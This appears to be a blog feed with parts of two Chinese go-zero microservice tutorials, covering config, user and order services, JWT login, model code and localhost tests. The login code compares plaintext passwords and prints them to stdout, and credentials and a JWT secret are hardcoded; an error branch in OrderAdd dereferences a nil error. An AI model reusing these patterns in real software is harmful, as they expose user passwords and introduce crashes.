<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Name: order</span><br><span class="line">Host: 0.0.0.0</span><br><span class="line">Port: 8889</span><br><span class="line">Mysql:</span><br><span class="line">  DataSource: root:123456@tcp(127.0.0.1:3306)/go_zero?charset=utf8mb4&amp;parseTime=true&amp;loc=Asia%2FShanghai</span><br><span class="line">CacheRedis:</span><br><span class="line">  - Host: 127.0.0.1:6379</span><br><span class="line">    Pass: &quot;&quot;</span><br><span class="line">    Type: node</span><br><span class="line">Auth:</span><br><span class="line">  # 生成jwt token的密钥 一般格式为udid</span><br><span class="line">  AccessSecret: 0c891c78-9415-ec96-deb8-3b658f9e57f3</span><br><span class="line">  # jwt token有效期，单位：秒,现在设置的为1小时</span><br><span class="line">  AccessExpire: 3600</span><br><span class="line"># 加入user rpc</span><br><span class="line">UserRpc: </span><br><span class="line">  Etcd:</span><br><span class="line">    Hosts:</span><br><span class="line">    - 127.0.0.1:2379</span><br><span class="line">    Key: user.rpc</span><br></pre></td></tr></table></figure>

<ul>
<li><code>order/api/internal/svc/servicecontext.go</code>  添加依赖</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package svc</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;study-gozero-demo/mall/order/api/internal/config&quot;</span><br><span class="line">	&quot;study-gozero-demo/mall/order/model&quot;</span><br><span class="line">	&quot;study-gozero-demo/mall/user/rpc/userclient&quot;</span><br><span class="line"></span><br><span class="line">	&quot;github.com/zeromicro/go-zero/core/stores/sqlx&quot;</span><br><span class="line">	&quot;github.com/zeromicro/go-zero/zrpc&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type ServiceContext struct &#123;</span><br><span class="line">	Config config.Config</span><br><span class="line">	// 引入model层的增删改查</span><br><span class="line">	OrderModel model.OrderModel</span><br><span class="line">	// 引用最终生成user服务代码路径</span><br><span class="line">	UserRpc userclient.User</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func NewServiceContext(c config.Config) *ServiceContext &#123;</span><br><span class="line">	// 初始化mysql连接</span><br><span class="line">	conn := sqlx.NewMysql(c.Mysql.DataSource)</span><br><span class="line">	return &amp;ServiceContext&#123;</span><br><span class="line">		Config: c,</span><br><span class="line">		// 调用order/model层代码</span><br><span class="line">		OrderModel: model.NewOrderModel(conn, c.CacheRedis),</span><br><span class="line">		// 调用user rpc</span><br><span class="line">		UserRpc: userclient.NewUser(zrpc.MustNewClient(c.UserRpc)),</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="逻辑编写"><a href="#逻辑编写" class="headerlink" title="逻辑编写"></a>逻辑编写</h3><ul>
<li>编写<code>order\api\internal\logic\orderaddlogic.go</code> 业务代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import (</span><br><span class="line">	&quot;context&quot;</span><br><span class="line">	&quot;errors&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line"></span><br><span class="line">	&quot;study-gozero-demo/mall/order/api/internal/svc&quot;</span><br><span class="line">	&quot;study-gozero-demo/mall/order/api/internal/types&quot;</span><br><span class="line">	&quot;study-gozero-demo/mall/order/model&quot;</span><br><span class="line"></span><br><span class="line">	&quot;github.com/jinzhu/copier&quot;</span><br><span class="line">	&quot;github.com/zeromicro/go-zero/core/logx&quot;</span><br><span class="line">)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func (l *OrderAddLogic) OrderAdd(req *types.OrderAddReq) (resp *types.OrderAddRes, err error) &#123;</span><br><span class="line">	// todo: add your logic here and delete this line</span><br><span class="line">	var addReq model.Order</span><br><span class="line">	errCopy := copier.Copy(&amp;addReq, req)</span><br><span class="line">	if errCopy != nil &#123;</span><br><span class="line">		return nil, errCopy</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	respd, err2 := l.svcCtx.OrderModel.Insert(l.ctx, &amp;addReq)</span><br><span class="line">	fmt.Println(&quot;------respd:&quot;, respd, &quot;error:&quot;, err2)</span><br><span class="line">	if err2 != nil &#123;</span><br><span class="line">		fmt.Println(&quot;insert into error:&quot;, err)</span><br><span class="line">		return nil, errors.New(err.Error())</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 登录成功返回数据</span><br><span class="line">	return &amp;types.OrderAddRes&#123;</span><br><span class="line">		Code:     1,</span><br><span class="line">		Messsage: &quot;success&quot;,</span><br><span class="line">	&#125;, nil</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>编写<code>order\api\internal\logic\getorderlogic.go</code> 业务代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import (</span><br><span class="line">	&quot;context&quot;</span><br><span class="line">	&quot;errors&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line"></span><br><span class="line">	&quot;study-gozero-demo/mall/order/api/internal/svc&quot;</span><br><span class="line">	&quot;study-gozero-demo/mall/order/api/internal/types&quot;</span><br><span class="line">	&quot;study-gozero-demo/mall/user/rpc/user&quot;</span><br><span class="line"></span><br><span class="line">	&quot;github.com/zeromicro/go-zero/core/logx&quot;</span><br><span class="line">)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">func (l *GetOrderLogic) GetOrder(req *types.OrderReq) (resp *types.OrderReply, err error) &#123;</span><br><span class="line">	// todo: add your logic here and delete this line</span><br><span class="line"></span><br><span class="line">	// 使用user rpc</span><br><span class="line">	// 新增代码，注意这里的&amp;user，应用的是user rpc的user/user.pb.go中内容,IdRequest其实就是对应入参（user.proto定义的）</span><br><span class="line"></span><br><span class="line">	_, err = l.svcCtx.UserRpc.GetUser(l.ctx, &amp;user.IdRequest&#123;</span><br><span class="line">		Id: int64(req.UserId),</span><br><span class="line">	&#125;)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, errors.New(&quot;用户不存在&quot;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	userInfo, err2 := l.svcCtx.OrderModel.FindOne(l.ctx, int64(req.Id))</span><br><span class="line">	fmt.Println(&quot;userInfo=&quot;, userInfo, &quot;error:&quot;, err2)</span><br><span class="line">	if userInfo == nil &#123;</span><br><span class="line">		fmt.Println(&quot;iiiiiiii&quot;)</span><br><span class="line">		return nil, errors.New(&quot;订单不存在&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">	return &amp;types.OrderReply&#123;</span><br><span class="line">		Id:          req.Id,</span><br><span class="line">		ProductName: userInfo.Productname.String,</span><br><span class="line">	&#125;, nil</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="启动各个服务"><a href="#启动各个服务" class="headerlink" title="启动各个服务"></a>启动各个服务</h2><ul>
<li>启动user rpc，主要验证用户是否存在</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\study-gozero-demo\mall\user\rpc&gt; go run user.go</span><br><span class="line">Starting rpc server at 0.0.0.0:8080...</span><br></pre></td></tr></table></figure>

<ul>
<li>启动user api，用来登录返回token</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\study-gozero-demo\mall\user\api&gt; go run .\user.go</span><br><span class="line">Starting server at 0.0.0.0:8888.</span><br></pre></td></tr></table></figure>

<ul>
<li>启动order api，对外的接口</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\study-gozero-demo\mall\order\api&gt; go run .\order.go</span><br><span class="line">Starting server at 0.0.0.0:8889...</span><br><span class="line">&#123;&quot;@timestamp&quot;:&quot;2023-07-30T16:03:50.226+08:00&quot;,&quot;cal</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul>
<li>测试GetOrder的接口<ul>
<li>如果传递的userid错误，就返回用户不存在错误</li>
<li>如果传递的id错误，就返回的订单d不存在</li>
<li>如果userid和id正确，就返回订单的信息</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">data2 = &#123;&quot;userid&quot;: 20, &quot;id&quot;: 1&#125;</span><br><span class="line">resp = requests.get(&quot;http://127.0.0.1:8889/api/order/get&quot;, json=data2)</span><br><span class="line">print(resp.text)</span><br><span class="line"></span><br><span class="line">&#123;&quot;id&quot;:1,&quot;productname&quot;:&quot;西瓜&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>测试OrderAdd的接口<ul>
<li>如果不带正确token的头部，就返回401</li>
<li>如果传递带正确token的头部，就返回新增成功信息</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data1 =&#123;&quot;productname&quot;:&quot;西瓜&quot;,&quot;price&quot;: &quot;122&quot;, &quot;unit&quot;: &quot;个&quot;&#125;</span><br><span class="line">resp = requests.post(&quot;http://127.0.0.1:8889/api/order/OrderAdd&quot;, json=data1)</span><br><span class="line">print(resp)</span><br><span class="line"></span><br><span class="line">&lt;Response [401]&gt;</span><br><span class="line"></span><br><span class="line">data =&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;123456&quot;&#125;</span><br><span class="line">resp = requests.post(&quot;http://127.0.0.1:8888/user/login&quot;, json=data)</span><br><span class="line">data = json.loads(resp.text)</span><br><span class="line">token = data[&quot;accessToken&quot;]</span><br><span class="line">header = &#123;&quot;Authorization&quot;: token&#125;</span><br><span class="line">data1 =&#123;&quot;productname&quot;:&quot;西瓜&quot;,&quot;price&quot;: &quot;122&quot;, &quot;unit&quot;: &quot;个&quot;&#125;</span><br><span class="line">resp = requests.post(&quot;http://127.0.0.1:8889/api/order/OrderAdd&quot;, headers=header,json=data1)</span><br><span class="line">print(resp.text)</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;:1,&quot;message&quot;:&quot;success&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="自定义错误"><a href="#自定义错误" class="headerlink" title="自定义错误"></a>自定义错误</h2><h3 id="业务错误响应格式"><a href="#业务错误响应格式" class="headerlink" title="业务错误响应格式"></a>业务错误响应格式</h3><ul>
<li>业务处理正常</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: 0,</span><br><span class="line">  &quot;msg&quot;: &quot;successful&quot;,</span><br><span class="line">  &quot;data&quot;: &#123;</span><br><span class="line">    ....</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>业务处理异常</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: 10001,</span><br><span class="line">  &quot;msg&quot;: &quot;参数错误&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="user-api之login"><a href="#user-api之login" class="headerlink" title="user api之login"></a>user api之login</h4><ul>
<li>在之前，我们在登录逻辑中处理用户名不存在时，直接返回来一个error。我们来登录并传递一个不存在的用户名看看效果。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST \</span><br><span class="line">  http://127.0.0.1:8888/user/login \</span><br><span class="line">  -H &#x27;content-type: application/json&#x27; \</span><br><span class="line">  -d &#x27;&#123;</span><br><span class="line">    &quot;username&quot;:&quot;1&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;123456&quot;</span><br><span class="line">&#125;&#x27;</span><br><span class="line"></span><br><span class="line">用户名不存在</span><br></pre></td></tr></table></figure>

<p>接下来我们将其以json格式进行返回</p>
<h3 id="自定义错误-1"><a href="#自定义错误-1" class="headerlink" title="自定义错误"></a>自定义错误</h3><ul>
<li>首先在common中添加一个baseerror.go文件，并填入代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir common</span><br><span class="line">cd common</span><br><span class="line">mkdir errorx&amp;&amp;cd errorx</span><br></pre></td></tr></table></figure>

<ul>
<li>编写自定义代码<code>mall\common\errorx\baseerror.go</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> errorx</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> defaultCode = <span class="number">1001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> CodeError <span class="keyword">struct</span> &#123;</span><br><span class="line">	Code <span class="type">int</span>    <span class="string">`json:&quot;code&quot;`</span></span><br><span class="line">	Msg  <span class="type">string</span> <span class="string">`json:&quot;msg&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> CodeErrorResponse <span class="keyword">struct</span> &#123;</span><br><span class="line">	Code <span class="type">int</span>    <span class="string">`json:&quot;code&quot;`</span></span><br><span class="line">	Msg  <span class="type">string</span> <span class="string">`json:&quot;msg&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewCodeError</span><span class="params">(code <span class="type">int</span>, msg <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;CodeError&#123;Code: code, Msg: msg&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewDefaultError</span><span class="params">(msg <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> NewCodeError(defaultCode, msg)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *CodeError)</span></span> Error() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> e.Msg</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *CodeError)</span></span> Data() *CodeErrorResponse &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;CodeErrorResponse&#123;</span><br><span class="line">		Code: e.Code,</span><br><span class="line">		Msg:  e.Msg,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>将登录逻辑中错误用CodeError自定义错误替换</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (l *LoginLogic) Login(req *types.LoginReq) (resp *types.LoginReply, err error) &#123;</span><br><span class="line">	// todo: add your logic here and delete this line</span><br><span class="line"></span><br><span class="line">	if len(strings.TrimSpace(req.Username)) == 0 || len(strings.TrimSpace(req.Password)) == 0 &#123;</span><br><span class="line">		// return nil, errors.New(&quot;参数错误&quot;)</span><br><span class="line">		return nil, errorx.NewDefaultError(&quot;参数错误&quot;)</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	userInfo, err := l.svcCtx.UserModel.FindOneByUsername(l.ctx, req.Username)</span><br><span class="line">	fmt.Println(&quot;userInfo=&quot;, userInfo, &quot;error:&quot;, err)</span><br><span class="line">	switch err &#123;</span><br><span class="line">	case nil:</span><br><span class="line">	case model.ErrNotFound:</span><br><span class="line">		// return nil, errors.New(&quot;用户名不存在&quot;)</span><br><span class="line">		return nil, errorx.NewDefaultError(&quot;用户名不存在&quot;)</span><br><span class="line"></span><br><span class="line">	default:</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(&quot;pwd:&quot;, userInfo.Password.String)</span><br><span class="line">	fmt.Println(&quot;pwd:&quot;, req.Password)</span><br><span class="line"></span><br><span class="line">	if userInfo.Password.String != req.Password &#123;</span><br><span class="line">		// return nil, errors.New(&quot;用户密码不正确&quot;)</span><br><span class="line">		return nil, errorx.NewDefaultError(&quot;用户密码不正确&quot;)</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// ---jwt-start---</span><br><span class="line"></span><br><span class="line">	now := time.Now().Unix()</span><br><span class="line">	accessExpire := l.svcCtx.Config.Auth.AccessExpire</span><br><span class="line">	jwtToken, err := l.getJwtToken(l.svcCtx.Config.Auth.AccessSecret, now, l.svcCtx.Config.Auth.AccessExpire, userInfo.Id)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	// ---jwt-end---</span><br><span class="line"></span><br><span class="line">	// 登录成功返回数据</span><br><span class="line">	return &amp;types.LoginReply&#123;</span><br><span class="line">		Id:           userInfo.Id,</span><br><span class="line">		Username:     userInfo.Username.String,</span><br><span class="line">		AccessToken:  jwtToken,</span><br><span class="line">		AccessExpire: now + accessExpire,</span><br><span class="line">		RefreshAfter: now + accessExpire/2,</span><br><span class="line">	&#125;, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>开启自定义错误，配置<code>user/api/user.go</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;flag&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line"></span><br><span class="line">	&quot;study-gozero-demo/mall/common/errorx&quot;</span><br><span class="line">	&quot;study-gozero-demo/mall/user/api/internal/config&quot;</span><br><span class="line">	&quot;study-gozero-demo/mall/user/api/internal/handler&quot;</span><br><span class="line">	&quot;study-gozero-demo/mall/user/api/internal/svc&quot;</span><br><span class="line"></span><br><span class="line">	&quot;github.com/zeromicro/go-zero/core/conf&quot;</span><br><span class="line">	&quot;github.com/zeromicro/go-zero/rest&quot;</span><br><span class="line">	&quot;github.com/zeromicro/go-zero/rest/httpx&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var configFile = flag.String(&quot;f&quot;, &quot;etc/user-api.yaml&quot;, &quot;the config file&quot;)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	flag.Parse()</span><br><span class="line"></span><br><span class="line">	var c config.Config</span><br><span class="line">	conf.MustLoad(*configFile, &amp;c)</span><br><span class="line"></span><br><span class="line">	server := rest.MustNewServer(c.RestConf)</span><br><span class="line">	defer server.Stop()</span><br><span class="line"></span><br><span class="line">	ctx := svc.NewServiceContext(c)</span><br><span class="line">	handler.RegisterHandlers(server, ctx)</span><br><span class="line">	// 自定义错误</span><br><span class="line">	httpx.SetErrorHandler(func(err error) (int, interface&#123;&#125;) &#123;</span><br><span class="line">		switch e := err.(type) &#123;</span><br><span class="line">		case *errorx.CodeError:</span><br><span class="line">			return http.StatusOK, e.Data()</span><br><span class="line">		default:</span><br><span class="line">			return http.StatusInternalServerError, nil</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	fmt.Printf(&quot;Starting server at %s:%d...\n&quot;, c.Host, c.Port)</span><br><span class="line">	server.Start()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>重新运行<code>user\api\user.go</code></p>
</li>
<li><p>再次测试</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> curl -X POST   http://127.0.0.1:8888/user/login   -H &#x27;content-type: application/json&#x27;   -d &#x27;&#123;</span><br><span class="line">    &quot;username&quot;:&quot;1&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;123456&quot;</span><br><span class="line">&#125;&#x27;</span><br><span class="line">&#123;&quot;code&quot;:1001,&quot;msg&quot;:&quot;用户名不存在&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>go-zero</tag>
      </tags>
  </entry>
  <entry>
    <title>go-zero入门实践二</title>
    <url>/aposts/f231d6a2/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>紧接<a href="/aposts/93e757c2">上篇文章</a></li>
<li>本篇文章开始接入mysql等具体的业务逻辑</li>
</ul>
<h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><ul>
<li>order 和 user 目录下分别新增model、api目录等</li>
</ul>
<p><img src="/aposts/f231d6a2/image-20230727101351298.png" alt="image-20230727101351298"></p>
<h2 id="单体服务"><a href="#单体服务" class="headerlink" title="单体服务"></a>单体服务</h2><ul>
<li>user为单体api服务，编写对外的增删改查接口</li>
<li><code>user/model</code>目录下的sql脚本，自动生成model代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE `user` (</span><br><span class="line">	`id` INT(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">	`username` VARCHAR(50) NULL DEFAULT NULL COLLATE &#x27;utf8_general_ci&#x27;,</span><br><span class="line">	`password` TEXT NULL DEFAULT NULL COLLATE &#x27;utf8_general_ci&#x27;,</span><br><span class="line">	`gender` VARCHAR(50) NULL DEFAULT NULL COLLATE &#x27;utf8_general_ci&#x27;,</span><br><span class="line">	PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">)</span><br><span class="line">COLLATE=&#x27;utf8_general_ci&#x27;</span><br><span class="line">ENGINE=InnoDB</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行命令生成user下的model代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork\study-gozero-demo\mall\user\model&gt; goctl model mysql ddl -src user.sql -dir . -c </span><br></pre></td></tr></table></figure>

<ul>
<li>在user&#x2F;model下面生成了对model中增删改查</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork\study-gozero-demo\mall\user\model&gt;ls</span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         2023/7/27     10:05            338 user.sql</span><br><span class="line">-a----         2023/7/27     10:35            623 usermodel.go</span><br><span class="line">-a----         2023/7/27     10:35           3995 usermodel_gen.go</span><br><span class="line">-a----         2023/7/27     10:35            106 vars.</span><br></pre></td></tr></table></figure>

<ul>
<li>发现<code>usermodel_gen.go</code> 中代码没有查询用户名和密码的函数，因此新增一个，同时新增一个查询所有用户的函数</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> (</span><br><span class="line">	userModel <span class="keyword">interface</span> &#123;</span><br><span class="line">		Insert(ctx context.Context, data *User) (sql.Result, <span class="type">error</span>)</span><br><span class="line">		FindOne(ctx context.Context, id <span class="type">int64</span>) (*User, <span class="type">error</span>)</span><br><span class="line">		<span class="comment">// 新增的查询用户名函数</span></span><br><span class="line">		FindOneByUsername(ctx context.Context, username <span class="type">string</span>) (*User, <span class="type">error</span>)</span><br><span class="line">        <span class="comment">// 查询所有的用户</span></span><br><span class="line">        FindAll(ctx context.Context, name <span class="type">string</span>) ([]*User, <span class="type">error</span>)</span><br><span class="line">		Update(ctx context.Context, data *User) <span class="type">error</span></span><br><span class="line">		Delete(ctx context.Context, id <span class="type">int64</span>) <span class="type">error</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	.....</span><br><span class="line"><span class="comment">// 查询用户名,若存在则返回user的数据</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *defaultUserModel)</span></span> FindOneByUsername(ctx context.Context, username <span class="type">string</span>) (*User, <span class="type">error</span>) &#123;</span><br><span class="line">	userUsernameKey := fmt.Sprintf(<span class="string">&quot;%s%v&quot;</span>, cacheUserIdPrefix, username)</span><br><span class="line">	<span class="keyword">var</span> resp User</span><br><span class="line">	err := m.QueryRowIndexCtx(ctx, &amp;resp, userUsernameKey, m.formatPrimary, <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, conn sqlx.SqlConn, v <span class="keyword">interface</span>&#123;&#125;)</span></span> (i <span class="keyword">interface</span>&#123;&#125;, e <span class="type">error</span>) &#123;</span><br><span class="line">		query := fmt.Sprintf(<span class="string">&quot;select %s from %s where `username` = ? limit 1&quot;</span>, userRows, m.table)</span><br><span class="line">		<span class="keyword">if</span> err := conn.QueryRowCtx(ctx, &amp;resp, query, username); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> resp.Id, <span class="literal">nil</span></span><br><span class="line">	&#125;, m.queryPrimary)</span><br><span class="line">	<span class="keyword">switch</span> err &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="literal">nil</span>:</span><br><span class="line">		<span class="keyword">return</span> &amp;resp, <span class="literal">nil</span></span><br><span class="line">	<span class="keyword">case</span> sqlc.ErrNotFound:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, ErrNotFound</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *defaultUserModel)</span></span> FindAll(ctx context.Context, username <span class="type">string</span>) ([]*User, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> resp []*User</span><br><span class="line">	<span class="keyword">var</span> query <span class="type">string</span></span><br><span class="line">	<span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(strings.TrimSpace(username)) &gt; <span class="number">0</span> &#123;</span><br><span class="line">		query = fmt.Sprintf(<span class="string">&quot;select %s from %s where `username` = ?&quot;</span>, userRows, m.table)</span><br><span class="line">		err = m.QueryRowsNoCacheCtx(ctx, &amp;resp, query, username)</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		query = fmt.Sprintf(<span class="string">&quot;select %s from %s&quot;</span>, userRows, m.table)</span><br><span class="line">		err = m.QueryRowsNoCacheCtx(ctx, &amp;resp, query)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// fmt.Println(&quot;query=&quot;, query)</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;query=&quot;</span>, query, <span class="string">&quot;error:&quot;</span>, err)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> err &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="literal">nil</span>:</span><br><span class="line">		<span class="keyword">return</span> resp, <span class="literal">nil</span></span><br><span class="line">	<span class="keyword">case</span> sqlc.ErrNotFound:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, ErrNotFound</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>需要注意的是，<code>moder_gen.go</code> 文件是由 <code>goctl</code> 工具自动生成的，每次执行 <code>goctl</code> 命令时都会重新生成该文件。因此，在修改表结构或需要重新生成代码时，应该先备份自定义的代码，并注意保留所需的代码或修改</p>
</blockquote>
<ul>
<li>修改<code>user/api/user.api </code>内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type (</span><br><span class="line">	User &#123;</span><br><span class="line">		Id       int64  `json:&quot;id&quot;`</span><br><span class="line">		Username string `json:&quot;username&quot;`</span><br><span class="line">		Gender   string `json:&quot;gender&quot;`</span><br><span class="line">		Password string `json:&quot;password&quot;`</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	LoginReq &#123;</span><br><span class="line">		Username string `json:&quot;username&quot;`</span><br><span class="line">		Password string `json:&quot;password&quot;`</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	LoginReply &#123;</span><br><span class="line">		Id       int64  `json:&quot;id&quot;`</span><br><span class="line">		Username string `json:&quot;username&quot;`</span><br><span class="line">		Gender       string `json:&quot;gender&quot;`</span><br><span class="line">		// 下面三个为jwt鉴权需要用到</span><br><span class="line">		AccessToken  string `json:&quot;accessToken&quot;`</span><br><span class="line">		AccessExpire int64  `json:&quot;accessExpire&quot;`</span><br><span class="line">		RefreshAfter int64  `json:&quot;refreshAfter&quot;`</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	UserAddReq &#123;</span><br><span class="line">		Username string `json:&quot;username&quot;`</span><br><span class="line">		Password string `json:&quot;password&quot;`</span><br><span class="line">		Gender   string `json:&quot;gender&quot;`</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	UserAddRes &#123;</span><br><span class="line">		Id   int64  `json:&quot;id&quot;`</span><br><span class="line">		Name string `json:&quot;name&quot;`</span><br><span class="line">	&#125;</span><br><span class="line">	UserDelReq &#123;</span><br><span class="line">		Id int64 `json:&quot;id&quot;`</span><br><span class="line">	&#125;</span><br><span class="line">	UserDelRes &#123;</span><br><span class="line">		Id       int64  `json:&quot;id&quot;`</span><br><span class="line">		Username string `json:&quot;username&quot;`</span><br><span class="line">	&#125;</span><br><span class="line">	UserEditReq &#123;</span><br><span class="line">		Id       int64  `json:&quot;id&quot;`</span><br><span class="line">		Username string `json:&quot;username&quot;`</span><br><span class="line">		Password string `json:&quot;password&quot;`</span><br><span class="line">		Gender   string `json:&quot;gender&quot;`</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	UserEditRes &#123;</span><br><span class="line">		Id       int64  